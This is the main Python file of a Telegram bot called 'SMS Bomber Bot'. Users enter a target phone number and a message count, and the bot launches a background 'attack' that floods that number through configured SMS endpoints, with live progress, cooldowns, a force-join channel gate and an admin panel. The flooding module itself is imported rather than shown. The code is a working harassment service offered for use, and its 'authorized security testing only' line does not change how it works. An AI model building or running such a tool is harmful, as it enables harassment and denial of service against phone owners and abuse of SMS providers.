#!/usr/bin/env python3
"""
SMS Bomber Bot - Main Application
Python 3.8+  |  Pyrogram 2.x  |  Polling mode
"""

import os
import sys
import asyncio
import logging
import unicodedata
from pathlib import Path
from functools import wraps
from datetime import datetime, timedelta
from typing import Dict, Optional, Callable, Awaitable, Tuple

# ============================================================
# 1.  LOAD .env FIRST
# ============================================================
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass  # python-dotenv not installed — rely on system env

# ============================================================
# 2.  VALIDATE REQUIRED ENV VARS (fail fast, before any import)
# ============================================================
_missing = []
if not os.getenv("BOT_TOKEN", "").strip():  _missing.append("BOT_TOKEN")
if not os.getenv("API_ID",    "").strip():  _missing.append("API_ID")
if not os.getenv("API_HASH",  "").strip():  _missing.append("API_HASH")

if _missing:
    sys.exit(
        "\n" + "=" * 55 + "\n"
        "❌  BOT CONFIGURATION ERROR\n"
        "=" * 55 + "\n"
        f"Missing environment variables: {', '.join(_missing)}\n\n"
        "Create a .env file with:\n"
        "  BOT_TOKEN=<from @BotFather>\n"
        "  API_ID=<from my.telegram.org>\n"
        "  API_HASH=<from my.telegram.org>\n"
        "=" * 55
    )

# ============================================================
# 3.  LOGGING  (before any other imports that might log)
# ============================================================
LOG_FILE = Path(os.getenv("BOT_LOG_PATH", "./logs/bot.log")).expanduser().resolve()

_handlers: list = [logging.StreamHandler(sys.stdout)]
try:
    LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
    _handlers.append(logging.FileHandler(LOG_FILE, encoding="utf-8"))
except (PermissionError, OSError) as _e:
    print(f"[WARN] Cannot create log file at {LOG_FILE}: {_e} — stdout only.")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(name)s | %(levelname)s | %(message)s",
    handlers=_handlers,
)
logger = logging.getLogger(__name__)

# ============================================================
# 4.  IMPORT CONFIG
# ============================================================
try:
    from config import (
        bot_config, channel_config, rate_limits,
        MESSAGES, TARGET_ENDPOINTS, ADMIN_IDS,
    )
    logger.info("Config loaded. Endpoints: %d", len(TARGET_ENDPOINTS))
except Exception as _e:
    logger.critical("Failed to import config: %s", _e, exc_info=True)
    sys.exit(1)

# ============================================================
# 5.  IMPORT SMS MODULE
# ============================================================
try:
    from sms import SMSBomber, validate_phone, AttackStats
    logger.info("SMS module loaded.")
except Exception as _e:
    logger.critical("Failed to import sms: %s", _e, exc_info=True)
    sys.exit(1)

# ============================================================
# 6.  IMPORT PYROGRAM
# ============================================================
try:
    from pyrogram import Client, filters, idle
    from pyrogram.enums import ParseMode                          # ← CRITICAL FIX
    from pyrogram.types import (
        InlineKeyboardMarkup, InlineKeyboardButton,
        Message, CallbackQuery,
    )
    from pyrogram.errors import (
        UserNotParticipant, FloodWait,
        MessageNotModified, ChatAdminRequired,
    )
    logger.info("Pyrogram imported successfully.")
except ImportError as _e:
    logger.critical("Pyrogram import failed: %s", _e, exc_info=True)
    sys.exit(1)


# ============================================================
# CONSTANTS
# ============================================================
MAX_GLOBAL_COUNT      = 10 ** 12
MAX_TEXT_INPUT_LEN    = 100
MAX_COUNT_INPUT_LEN   = 10
COMMAND_COOLDOWN_SECS = 3

_command_cooldowns: Dict[int, Dict[str, datetime]] = {}


# ============================================================
# INPUT SANITIZATION
# ============================================================

def sanitize_input(text: str, max_length: int = MAX_TEXT_INPUT_LEN) -> str:
    """Normalize unicode and strip control characters."""
    if not text:
        return ""
    normalized = unicodedata.normalize("NFKC", text)
    filtered = "".join(ch for ch in normalized if ch == "\n" or ord(ch) >= 32)
    return filtered[:max_length].strip()


# ============================================================
# PER-COMMAND RATE LIMITER DECORATOR
# ============================================================

def rate_limit(command_name: str, cooldown_seconds: int = COMMAND_COOLDOWN_SECS):
    def decorator(func: Callable[..., Awaitable[None]]):
        @wraps(func)
        async def wrapper(client: Client, message: Message):
            user = message.from_user
            if not user:
                return await func(client, message)

            now = datetime.now()
            user_limits = _command_cooldowns.setdefault(user.id, {})
            last_used = user_limits.get(command_name)
            if last_used:
                elapsed = (now - last_used).total_seconds()
                if elapsed < cooldown_seconds:
                    wait = max(1, int(cooldown_seconds - elapsed))
                    await message.reply_text(
                        f"⏳ Slow down. Try again in {wait}s."
                    )
                    return

            user_limits[command_name] = now
            return await func(client, message)
        return wrapper
    return decorator


# ============================================================
# SESSION DATA
# ============================================================

class UserSession:
    """Per-user session state — lock-protected."""

    __slots__ = (
        "user_id", "username", "step", "phone",
        "count", "last_attack", "total_attacks",
        "message_id", "chat_id", "_lock",
    )

    def __init__(self, user_id: int, username: Optional[str] = None):
        self.user_id      = user_id
        self.username     = username
        self.step         = "idle"        # idle | phone | count | attacking
        self.phone: Optional[str]         = None
        self.count        = 0
        self.last_attack: Optional[datetime] = None
        self.total_attacks = 0
        self.message_id: Optional[int]   = None
        self.chat_id: Optional[int]       = None
        self._lock        = asyncio.Lock()

    async def set(self, **kwargs):
        """Atomically update one or more fields."""
        async with self._lock:
            for k, v in kwargs.items():
                if hasattr(self, k):
                    setattr(self, k, v)


# ============================================================
# GLOBAL BOT STATE
# ============================================================

class BotState:
    """Thread-safe global bot state."""

    def __init__(self):
        self.sessions:       Dict[int, UserSession] = {}
        self.active_bombers: Dict[int, SMSBomber]   = {}
        self.cooldowns:      Dict[int, datetime]    = {}
        self.global_count   = 0
        self._lock          = asyncio.Lock()

    # ---- sessions ----

    def get_session(self, user_id: int, username: Optional[str] = None) -> UserSession:
        """Return existing session or create a new one."""
        if user_id not in self.sessions:
            self.sessions[user_id] = UserSession(user_id=user_id, username=username)
        return self.sessions[user_id]

    # ---- cooldown ----

    async def check_cooldown(self, user_id: int) -> Tuple[bool, str]:
        """Returns (can_proceed, remaining_time_str)."""
        async with self._lock:
            if user_id in self.cooldowns:
                elapsed    = datetime.now() - self.cooldowns[user_id]
                cooldown_td = timedelta(hours=rate_limits.COOLDOWN_HOURS)
                if elapsed < cooldown_td:
                    remaining = cooldown_td - elapsed
                    hours, rem = divmod(int(remaining.total_seconds()), 3600)
                    minutes, _ = divmod(rem, 60)
                    return False, f"{hours}h {minutes}m"
                else:
                    del self.cooldowns[user_id]
        return True, ""

    async def set_cooldown(self, user_id: int):
        async with self._lock:
            self.cooldowns[user_id] = datetime.now()

    # ---- bombers ----

    async def can_start_attack(self) -> bool:
        async with self._lock:
            return len(self.active_bombers) < rate_limits.MAX_CONCURRENT_ATTACKS

    async def try_register_bomber(self, user_id: int, bomber: SMSBomber) -> bool:
        """Atomically register bomber for user. Returns False if already running."""
        async with self._lock:
            if user_id in self.active_bombers:
                return False
            if len(self.active_bombers) >= rate_limits.MAX_CONCURRENT_ATTACKS:
                return False
            self.active_bombers[user_id] = bomber
            return True

    async def remove_bomber(self, user_id: int):
        async with self._lock:
            self.active_bombers.pop(user_id, None)

    # ---- global counter ----

    async def add_global_count(self, amount: int):
        async with self._lock:
            self.global_count = min(
                MAX_GLOBAL_COUNT,
                self.global_count + max(0, amount),
            )

    # ---- maintenance ----

    async def cleanup_expired_sessions(self):
        """Remove stale cooldowns and idle sessions to prevent memory growth."""
        expiry = timedelta(hours=max(1, rate_limits.COOLDOWN_HOURS * 2))
        now = datetime.now()
        async with self._lock:
            expired = [
                uid for uid, ts in self.cooldowns.items()
                if (now - ts) > expiry
            ]
            for uid in expired:
                self.cooldowns.pop(uid, None)
                if uid not in self.active_bombers:
                    self.sessions.pop(uid, None)
        logger.info("Cleanup done. Removed %d expired sessions.", len(expired))


# ============================================================
# CREATE PYROGRAM CLIENT   ← CRITICAL FIX: ParseMode enum
# ============================================================

state = BotState()

try:
    app = Client(
        "sms_bomber_bot",
        api_id     = bot_config.API_ID,
        api_hash   = bot_config.API_HASH,
        bot_token  = bot_config.TOKEN,
        workers    = 50,
        parse_mode = ParseMode.MARKDOWN,   # ← FIXED: was "markdown" (string) — BROKE ALL SENDS
    )
    logger.info("Pyrogram Client created successfully.")
except Exception as _e:
    logger.critical("Failed to create Pyrogram Client: %s", _e, exc_info=True)
    sys.exit(1)


# ============================================================
# KEYBOARDS
# ============================================================

def main_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Start Attack", callback_data="start")],
        [InlineKeyboardButton("📊 Statistics",   callback_data="stats")],
        [InlineKeyboardButton("❓ Help",          callback_data="help")],
    ])


def verify_keyboard() -> InlineKeyboardMarkup:
    buttons = []
    if channel_config.USERNAME:
        url = "https://t.me/" + channel_config.USERNAME.lstrip("@")
        buttons.append([InlineKeyboardButton("📢 Join Channel", url=url)])
    buttons.append([InlineKeyboardButton("✅ Verify Join", callback_data="verify")])
    buttons.append([InlineKeyboardButton("🔙 Back",        callback_data="back")])
    return InlineKeyboardMarkup(buttons)


def cancel_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Cancel Attack", callback_data="cancel")]
    ])


def done_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 New Attack", callback_data="start")],
        [InlineKeyboardButton("📊 Statistics", callback_data="stats")],
    ])


# ============================================================
# FORCE-JOIN HELPER
# ============================================================

async def check_force_join(client: Client, user_id: int) -> bool:
    """
    Returns True if user is allowed to proceed.
    Returns False if force-join is configured AND user has NOT joined.
    """
    if not channel_config.is_configured:
        return True   # Force-join disabled → always allow

    try:
        member = await client.get_chat_member(channel_config.ID, user_id)
        # Banned or kicked → deny
        if member.status.name in ("BANNED", "LEFT"):
            return False
        return True
    except UserNotParticipant:
        return False
    except ChatAdminRequired:
        # Bot is not admin in channel — skip check gracefully
        logger.warning(
            "Bot lacks admin rights in channel %s — force-join check skipped.",
            channel_config.USERNAME,
        )
        return True
    except Exception as exc:
        logger.error("check_force_join error for user %d: %s", user_id, exc, exc_info=True)
        return True   # On unexpected error → don't lock user out


async def send_force_join(message: Message):
    """Send the force-join prompt to the user."""
    await message.reply_text(
        MESSAGES["FORCE_JOIN"].format(channel=channel_config.USERNAME),
        reply_markup=verify_keyboard(),
    )


# ============================================================
# /start COMMAND
# ============================================================

@app.on_message(filters.command("start") & (filters.private | filters.group))
@rate_limit("start")
async def cmd_start(client: Client, message: Message):
    """Handle /start — entry point for every user."""
    user = message.from_user
    if not user:
        return

    try:
        # ── Force-join check ──────────────────────────────
        if not await check_force_join(client, user.id):
            await send_force_join(message)
            return

        # ── Reset session to idle cleanly ─────────────────
        session = state.get_session(user.id, user.username)
        await session.set(step="idle", phone=None, count=0)

        await message.reply_text(
            MESSAGES["WELCOME"].format(count=len(TARGET_ENDPOINTS)),
            reply_markup=main_keyboard(),
        )

    except FloodWait as exc:
        logger.warning("/start FloodWait: sleeping %ds", exc.value)
        await asyncio.sleep(exc.value)
    except Exception as exc:
        logger.error("/start error for user %d: %s", user.id, exc, exc_info=True)
        try:
            await message.reply_text("❌ Something went wrong. Please try /start again.")
        except Exception:
            pass


# ============================================================
# /help COMMAND
# ============================================================

@app.on_message(filters.command("help") & (filters.private | filters.group))
@rate_limit("help")
async def cmd_help(client: Client, message: Message):
    user = message.from_user
    if not user:
        return

    try:
        if not await check_force_join(client, user.id):
            await send_force_join(message)
            return

        help_text = (
            "❓ **Help — SMS Bomber Bot**\n\n"
            "**How to use:**\n"
            "1. Press **🚀 Start Attack**\n"
            "2. Enter the target phone number\n"
            "3. Enter how many SMS to send\n"
            "4. Watch live progress\n\n"
            "**Limits:**\n"
            f"• Max {rate_limits.MAX_ATTEMPTS_PER_USER} SMS per attack\n"
            f"• {rate_limits.COOLDOWN_HOURS}h cooldown between attacks\n"
            f"• Max {rate_limits.MAX_CONCURRENT_ATTACKS} simultaneous attacks (global)\n\n"
            "**Commands:**\n"
            "/start — Start the bot\n"
            "/help  — Show this message\n"
            "/stats — Your statistics\n"
            "/admin — Admin panel (admins only)\n\n"
            "⚠️ For authorized security testing only."
        )

        kb = main_keyboard() if message.chat.type.name == "PRIVATE" else None
        await message.reply_text(help_text, reply_markup=kb)

    except Exception as exc:
        logger.error("/help error: %s", exc, exc_info=True)
        try:
            await message.reply_text("❌ Error showing help.")
        except Exception:
            pass


# ============================================================
# /stats COMMAND
# ============================================================

@app.on_message(filters.command("stats") & (filters.private | filters.group))
@rate_limit("stats")
async def cmd_stats(client: Client, message: Message):
    user = message.from_user
    if not user:
        return

    try:
        if not await check_force_join(client, user.id):
            await send_force_join(message)
            return

        session  = state.get_session(user.id, user.username)
        last_atk = (
            session.last_attack.strftime("%Y-%m-%d %H:%M")
            if session.last_attack else "Never"
        )

        can_go, remaining = await state.check_cooldown(user.id)
        cooldown_str = "None" if can_go else f"⏳ {remaining} remaining"

        stats_text = (
            "📊 **Your Statistics**\n\n"
            f"👤 User: `{user.id}` (@{user.username or 'N/A'})\n"
            f"🎯 Total Attacks: {session.total_attacks}\n"
            f"📱 Last Target: {session.phone or 'N/A'}\n"
            f"⏱️ Last Attack: {last_atk}\n"
            f"🕐 Cooldown: {cooldown_str}\n\n"
            "**Global:**\n"
            f"⚡ Active Attacks: {len(state.active_bombers)}\n"
            f"📤 Total Sent: {state.global_count}"
        )

        kb = main_keyboard() if message.chat.type.name == "PRIVATE" else None
        await message.reply_text(stats_text, reply_markup=kb)

    except Exception as exc:
        logger.error("/stats error: %s", exc, exc_info=True)
        try:
            await message.reply_text("❌ Error fetching stats.")
        except Exception:
            pass


# ============================================================
# /admin COMMAND
# ============================================================

@app.on_message(filters.command("admin") & filters.private)
async def cmd_admin(client: Client, message: Message):
    user = message.from_user
    if not user:
        return

    try:
        if not ADMIN_IDS or user.id not in ADMIN_IDS:
            await message.reply_text(MESSAGES["UNAUTHORIZED"])
            return

        admin_text = (
            "🔐 **Admin Panel**\n\n"
            f"👤 Your ID: `{user.id}`\n"
            f"📊 Active Attacks: {len(state.active_bombers)}\n"
            f"🌍 Global SMS Sent: {state.global_count}\n"
            f"👥 Sessions: {len(state.sessions)}\n"
            f"🕐 Cooldowns Active: {len(state.cooldowns)}\n\n"
            "**Config:**\n"
            f"Channel: {channel_config.USERNAME or 'Not set'}\n"
            f"Admin IDs: {ADMIN_IDS or 'None'}\n"
            f"Max/User: {rate_limits.MAX_ATTEMPTS_PER_USER}\n"
            f"Cooldown: {rate_limits.COOLDOWN_HOURS}h\n"
            f"Concurrent: {rate_limits.MAX_CONCURRENT_ATTACKS}"
        )
        await message.reply_text(admin_text)

    except Exception as exc:
        logger.error("/admin error: %s", exc, exc_info=True)
        try:
            await message.reply_text("❌ Error in admin command.")
        except Exception:
            pass


# ============================================================
# CALLBACK QUERY HANDLER  (inline keyboard buttons)
# ============================================================

@app.on_callback_query()
async def callback_handler(client: Client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    data    = callback_query.data or ""

    try:
        # ── verify (force-join check button) ──────────────
        if data == "verify":
            if await check_force_join(client, user_id):
                session = state.get_session(user_id, callback_query.from_user.username)
                await session.set(step="idle")
                await callback_query.message.edit_text(
                    MESSAGES["WELCOME"].format(count=len(TARGET_ENDPOINTS)),
                    reply_markup=main_keyboard(),
                )
                await callback_query.answer("✅ Verified! Welcome.")
            else:
                await callback_query.answer(
                    "❌ You haven't joined the channel yet.", show_alert=True
                )
            return

        # ── Force-join gate for every other action ─────────
        if not await check_force_join(client, user_id):
            await callback_query.answer(
                "⚠️ Please join the channel first.", show_alert=True
            )
            return

        session = state.get_session(user_id, callback_query.from_user.username)

        # ── start ──────────────────────────────────────────
        if data == "start":
            # Check if already attacking
            if user_id in state.active_bombers:
                await callback_query.answer(
                    "⚠️ You already have an active attack!", show_alert=True
                )
                return

            # Check cooldown
            can_go, remaining = await state.check_cooldown(user_id)
            if not can_go:
                try:
                    await callback_query.message.edit_text(
                        MESSAGES["COOLDOWN"].format(remaining=remaining),
                        reply_markup=main_keyboard(),
                    )
                except MessageNotModified:
                    pass
                await callback_query.answer()
                return

            # Check global capacity
            if not await state.can_start_attack():
                await callback_query.answer(
                    "⚠️ Server is busy. Try again shortly.", show_alert=True
                )
                return

            await session.set(step="phone", phone=None, count=0)
            try:
                await callback_query.message.edit_text(
                    MESSAGES["ENTER_PHONE"],
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 Back", callback_data="back")]
                    ]),
                )
            except MessageNotModified:
                pass
            await callback_query.answer()

        # ── stats ──────────────────────────────────────────
        elif data == "stats":
            last_atk = (
                session.last_attack.strftime("%Y-%m-%d %H:%M")
                if session.last_attack else "Never"
            )
            can_go, remaining = await state.check_cooldown(user_id)
            cooldown_str = "None" if can_go else f"⏳ {remaining} remaining"

            stats_text = (
                "📊 **Your Statistics**\n\n"
                f"🎯 Total Attacks: {session.total_attacks}\n"
                f"📱 Last Target: {session.phone or 'N/A'}\n"
                f"⏱️ Last Attack: {last_atk}\n"
                f"🕐 Cooldown: {cooldown_str}\n\n"
                f"⚡ Active Attacks (global): {len(state.active_bombers)}\n"
                f"📤 Total Sent (global): {state.global_count}"
            )
            try:
                await callback_query.message.edit_text(
                    stats_text, reply_markup=main_keyboard()
                )
            except MessageNotModified:
                pass
            await callback_query.answer()

        # ── help ───────────────────────────────────────────
        elif data == "help":
            try:
                await callback_query.message.edit_text(
                    "❓ **Help**\n\nSend /help for detailed instructions.",
                    reply_markup=main_keyboard(),
                )
            except MessageNotModified:
                pass
            await callback_query.answer()

        # ── back ───────────────────────────────────────────
        elif data == "back":
            await session.set(step="idle")
            try:
                await callback_query.message.edit_text(
                    MESSAGES["WELCOME"].format(count=len(TARGET_ENDPOINTS)),
                    reply_markup=main_keyboard(),
                )
            except MessageNotModified:
                pass
            await callback_query.answer()

        # ── cancel ─────────────────────────────────────────
        elif data == "cancel":
            if user_id in state.active_bombers:
                bomber = state.active_bombers[user_id]
                await bomber.stop()               # cancels pending tasks
                await state.remove_bomber(user_id)

            await session.set(step="idle")
            try:
                await callback_query.message.edit_text(
                    "❌ Attack cancelled.",
                    reply_markup=main_keyboard(),
                )
            except MessageNotModified:
                pass
            await callback_query.answer("Cancelled.")

        else:
            await callback_query.answer("Unknown action.", show_alert=True)

    except FloodWait as exc:
        logger.warning("FloodWait in callback: sleeping %ds", exc.value)
        await asyncio.sleep(exc.value)
    except MessageNotModified:
        try:
            await callback_query.answer()
        except Exception:
            pass
    except Exception as exc:
        logger.error("Callback error (data=%r): %s", data, exc, exc_info=True)
        try:
            await callback_query.answer("An error occurred.", show_alert=True)
        except Exception:
            pass


# ============================================================
# TEXT MESSAGE HANDLER  (state machine for phone/count input)
# ============================================================

@app.on_message(
    filters.text
    & ~filters.command(["start", "help", "stats", "admin"])   # ← FIXED: exclude commands
    & (filters.private | filters.group)
)
async def text_handler(client: Client, message: Message):
    """Handle user text input for the attack flow."""
    user = message.from_user
    if not user:
        return

    # Bots, channels → ignore
    if user.is_bot:
        return

    try:
        text    = sanitize_input(message.text or "")
        session = state.get_session(user.id, user.username)

        await session.set(chat_id=message.chat.id)

        if not text:
            await message.reply_text("⚠️ Empty input is not allowed.")
            return

        back_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Back", callback_data="back")]
        ])

        # ── IDLE ──────────────────────────────────────────
        if session.step == "idle":
            # Only prompt in private chats; ignore noise in groups
            if message.chat.type.name == "PRIVATE":
                await message.reply_text(
                    "Press **🚀 Start Attack** to begin.",
                    reply_markup=main_keyboard(),
                )
            return

        # ── Force-join gate ────────────────────────────────
        if not await check_force_join(client, user.id):
            await send_force_join(message)
            return

        # ── PHONE INPUT ───────────────────────────────────
        if session.step == "phone":
            is_valid, result = validate_phone(text)
            if not is_valid:
                await message.reply_text(
                    MESSAGES["ERROR"].format(message=result),
                    reply_markup=back_kb,
                )
                return

            await session.set(phone=result, step="count")
            await message.reply_text(
                MESSAGES["ENTER_COUNT"].format(
                    max=rate_limits.MAX_ATTEMPTS_PER_USER,
                    cooldown=rate_limits.COOLDOWN_HOURS,
                ),
                reply_markup=back_kb,
            )
            return

        # ── COUNT INPUT ───────────────────────────────────
        if session.step == "count":
            if len(text) > MAX_COUNT_INPUT_LEN:
                await message.reply_text(
                    MESSAGES["ERROR"].format(message="Input too long. Enter a smaller number."),
                    reply_markup=back_kb,
                )
                return

            try:
                count = int(text)
            except ValueError:
                await message.reply_text(
                    MESSAGES["ERROR"].format(message="Please enter a valid whole number."),
                    reply_markup=back_kb,
                )
                return

            if count < 1 or count > rate_limits.MAX_ATTEMPTS_PER_USER:
                await message.reply_text(
                    MESSAGES["ERROR"].format(
                        message=f"Enter a number between 1 and {rate_limits.MAX_ATTEMPTS_PER_USER}."
                    ),
                    reply_markup=back_kb,
                )
                return

            # Check capacity again right before launching
            if not await state.can_start_attack():
                await message.reply_text(
                    "⚠️ Server is at full capacity. Please try again shortly.",
                    reply_markup=back_kb,
                )
                return

            await session.set(count=count, step="attacking")

            status_msg = await message.reply_text(
                MESSAGES["ATTACK_START"].format(
                    number=session.phone,
                    count=count,
                    endpoints=len(TARGET_ENDPOINTS),
                ),
                reply_markup=cancel_keyboard(),
            )
            await session.set(message_id=status_msg.id)

            bomber = SMSBomber(
                phone_number      = session.phone,
                count             = count,
                progress_callback = lambda stats: _update_progress(user.id, stats),
            )

            registered = await state.try_register_bomber(user.id, bomber)
            if not registered:
                await session.set(step="idle")
                await message.reply_text(
                    "⚠️ You already have an active attack running.",
                    reply_markup=main_keyboard(),
                )
                return

            # Fire-and-forget — runs in background
            asyncio.create_task(
                _run_attack(user.id, bomber, message.chat.id),
                name=f"attack_{user.id}",
            )
            return

        # ── ATTACKING (user sends text while attack running) ──
        if session.step == "attacking":
            await message.reply_text(
                "⏳ Attack in progress. Use **❌ Cancel Attack** to stop.",
                reply_markup=cancel_keyboard(),
            )

    except FloodWait as exc:
        logger.warning("FloodWait in text_handler: sleeping %ds", exc.value)
        await asyncio.sleep(exc.value)
    except Exception as exc:
        logger.error("text_handler error for user %d: %s", user.id, exc, exc_info=True)
        try:
            await message.reply_text("❌ An unexpected error occurred.")
        except Exception:
            pass


# ============================================================
# ATTACK HELPERS
# ============================================================

async def _update_progress(user_id: int, stats: AttackStats):
    """Push live progress to the user's status message."""
    session = state.get_session(user_id)
    if not session.message_id or session.chat_id is None:
        return

    bomber = state.active_bombers.get(user_id)
    if not bomber:
        return

    try:
        await app.edit_message_text(
            chat_id    = session.chat_id,
            message_id = session.message_id,
            text       = bomber.format_status(),
            reply_markup = cancel_keyboard(),
        )
    except MessageNotModified:
        pass
    except FloodWait:
        pass   # Skip this update — next one will come
    except Exception as exc:
        logger.error("Progress update error for user %d: %s", user_id, exc)


async def _run_attack(user_id: int, bomber: SMSBomber, chat_id: int):
    """Run the full attack lifecycle and send the completion message."""
    session = state.get_session(user_id)

    try:
        stats = await bomber.start()

        # Update session stats atomically
        async with session._lock:
            session.total_attacks += 1
            session.last_attack    = datetime.now()

        await state.set_cooldown(user_id)
        await state.add_global_count(stats.total)

        complete_text = MESSAGES["ATTACK_COMPLETE"].format(
            number    = session.phone,
            attempted = stats.total,
            success   = stats.success,
            failed    = stats.failed,
            duration  = stats.duration,
            rate      = stats.rate,
        )

        try:
            await app.edit_message_text(
                chat_id      = chat_id,
                message_id   = session.message_id,
                text         = complete_text,
                reply_markup = done_keyboard(),
            )
        except (MessageNotModified, Exception):
            # Fallback: send new message if edit fails
            try:
                await app.send_message(chat_id, complete_text, reply_markup=done_keyboard())
            except Exception:
                pass

    except asyncio.CancelledError:
        logger.info("Attack task cancelled for user %d", user_id)
    except Exception as exc:
        logger.error("Attack error for user %d: %s", user_id, exc, exc_info=True)
        try:
            await app.send_message(
                chat_id,
                MESSAGES["ERROR"].format(message="An internal error occurred. Please try again."),
                reply_markup=done_keyboard(),
            )
        except Exception:
            pass

    finally:
        # Always clean up — even on crash
        await session.set(step="idle")
        await state.remove_bomber(user_id)
        logger.info("Attack lifecycle complete for user %d", user_id)


# ============================================================
# MAIN ENTRY POINT
# ============================================================

async def main():
    """Start the bot, run cleanup, then enter idle polling loop."""
    logger.info("=" * 55)
    logger.info("SMS Bomber Bot — Starting")
    logger.info("  API_ID   : %s",    bot_config.API_ID)
    logger.info("  Token    : %s...", bot_config.TOKEN[:10])
    logger.info("  Endpoints: %d",    len(TARGET_ENDPOINTS))
    logger.info("  ForceJoin: %s",    "Enabled" if channel_config.is_configured else "Disabled")
    logger.info("  Admins   : %s",    ADMIN_IDS or "None")
    logger.info("=" * 55)

    await app.start()

    # Clean up stale sessions from previous run
    await state.cleanup_expired_sessions()

    me = await app.get_me()
    logger.info("✅ Bot online: @%s (ID: %d)", me.username, me.id)

    # idle() keeps the process alive and handles signals (SIGINT/SIGTERM)
    await idle()

    await app.stop()
    logger.info("Bot stopped cleanly.")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Stopped by user.")
    except Exception as exc:
        logger.critical("Fatal error: %s", exc, exc_info=True)
        sys.exit(1)
